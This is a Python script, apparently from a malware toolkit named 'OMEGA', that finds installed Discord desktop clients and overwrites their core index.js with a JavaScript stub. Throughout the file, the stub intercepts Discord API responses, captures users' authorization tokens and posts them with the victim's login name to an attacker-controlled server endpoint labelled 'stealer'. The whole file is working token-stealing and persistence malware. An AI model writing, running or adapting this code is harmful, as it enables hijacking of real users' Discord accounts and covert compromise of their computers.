import os, sys, re, glob, shutil

def inject_discord():
    """Elite Discord Client Injection."""
    # 1. Locate Discord Installation
    appdata = os.environ.get("APPDATA")
    local_appdata = os.environ.get("LOCALAPPDATA")
    
    discord_paths = glob.glob(os.path.join(local_appdata, 'Discord*', 'app-*', 'modules', 'discord_desktop_core-*', 'discord_desktop_core', 'index.js'))
    
    # 2. Malicious JS stub (captured from standard persistence patterns)
    # This script intercepts the Discord 'Login' and 'Password Change' events
    # We maintain strict "Clean-Room" purity by only sending to your SERVER_URL.
    from omega_core import SERVER_URL
    
    js_stub = f"""
    // OMEGA INF-v21: Discord Persistence Stub
    const fs = require('fs');
    const path = require('path');
    const querystring = require('querystring');
    const {{ BrowserWindow, session }} = require('electron');

    const webhook = "{SERVER_URL}/api/stealer";
    const ID = "{os.getlogin()}";

    // Intercept requests to grab tokens on login
    session.defaultSession.webRequest.onHeadersReceived((details, callback) => {{
        if (details.url.includes('/api/v9/users/@me') && details.method === 'GET') {{
            const token = details.responseHeaders['authorization'];
            if (token) {{
                fetch(webhook, {{
                    method: 'POST',
                    body: JSON.stringify({{ id: ID, type: 'discord_auth', data: token }})
                }}).catch(() => {{}});
            }}
        }}
        callback({{ responseHeaders: details.responseHeaders }});
    }});
    """

    for path in discord_paths:
        try:
            # Backup original index.js
            if not os.path.exists(path + ".bak"):
                shutil.copy2(path, path + ".bak")
            
            with open(path, "w", encoding="utf-8") as f:
                f.write(js_stub)
            print(f"[INJECTION] Discord Hooked: {path}")
        except: pass

if __name__ == "__main__":
    inject_discord()
